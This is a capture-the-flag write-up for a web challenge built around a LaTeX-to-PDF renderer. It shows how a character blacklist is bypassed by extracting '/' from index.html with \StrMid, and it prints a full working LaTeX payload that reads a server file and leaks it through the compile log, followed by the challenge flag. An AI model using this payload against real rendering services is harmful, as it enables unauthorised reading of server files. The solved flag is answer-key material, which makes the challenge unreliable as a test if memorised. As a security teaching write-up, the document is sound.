# Richard Simmons: Sweatin' in LaTeX
### Category: Web Exploitation
### Author: James Lowther (Articuler)

## Writeup
The website appears to be a renderer for LaTeX code. Writing LaTex and clicking "Generate PDF" gives a link to a rendered PDf. 

1. Looking at the source HTML indicates that we need to read the flag from a file found in `/sweatin/to/the/oldies/flag.txt`.
2. LaTeX has the ability to read files, however certain strings have been blacklisted. Most notably, `/` has been blacklisted making it challenging to create the path to read the file.
3. The `/` character however can be isolated from `index.html` using the `\StrMid` function from the `xstring` package.
4. Using this we can build the following LaTeX code that will read build the path and read the flag:
```
\documentclass{minimal}
\usepackage{xstring}

\def\a{sweatin}
\def\b{to}
\def\c{the}
\def\d{oldies}
\def\e{flag.txt}

\newread\file
\immediate\openin\file=index.html
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\StrMid{\fileline}{43}{43}[\s]
\immediate\message{\s}
\immediate\closein\file

\immediate\openin\file=\s\a\s\b\s\c\s\d\s\e
\loop\unless\ifeof\file
    \read\file to\fileline
    \message{\fileline}
\repeat
\closein\file

\begin{document}
\end{document} 
```

The flag can be found in the returned LOG data.

## Flag
magpie{r1ch4rd_l0v35_t0_5w34t}